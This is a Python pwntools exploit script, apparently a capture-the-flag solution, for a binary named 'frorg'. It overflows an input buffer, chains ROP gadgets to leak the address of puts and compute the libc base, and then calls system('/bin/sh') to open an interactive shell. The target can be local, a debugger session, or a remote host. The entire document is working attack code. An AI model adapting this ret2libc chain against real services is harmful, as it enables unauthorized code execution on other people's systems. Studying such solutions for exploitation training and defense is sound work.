#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./frorg"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		#b *main+139
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


p.sendlineafter("store?", '9')

# leak libc address
rop_pop_rdi = 0x004011e5
rop_ret = 0x0040129c

padding = b'A' * 44
padding += p32(4)# for continue loop

p.send(padding)

payload = b'B' * 6
payload += p64(rop_pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])

sleep(0.5)
p.sendline(payload)

p.recvuntil("Thank you!\n")
leak = u64(p.recv(6) + b'\0' * 2)
log.info("puts@got: " + hex(leak))
libc_base = leak - libc.symbols["puts"]
libc.address = libc_base
log.info("libc base: " + hex(libc_base))
system_libc_addr = libc.symbols["system"]
log.info("system@libc: " + hex(system_libc_addr))
binsh_addr = next(libc.search(b'/bin/sh'))

# execute system("/bin/sh")
p.sendlineafter("store?", '9')
p.send(padding)
payload = b'B' * 6
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_libc_addr)

sleep(0.5)
p.sendline(payload)


p.interactive()
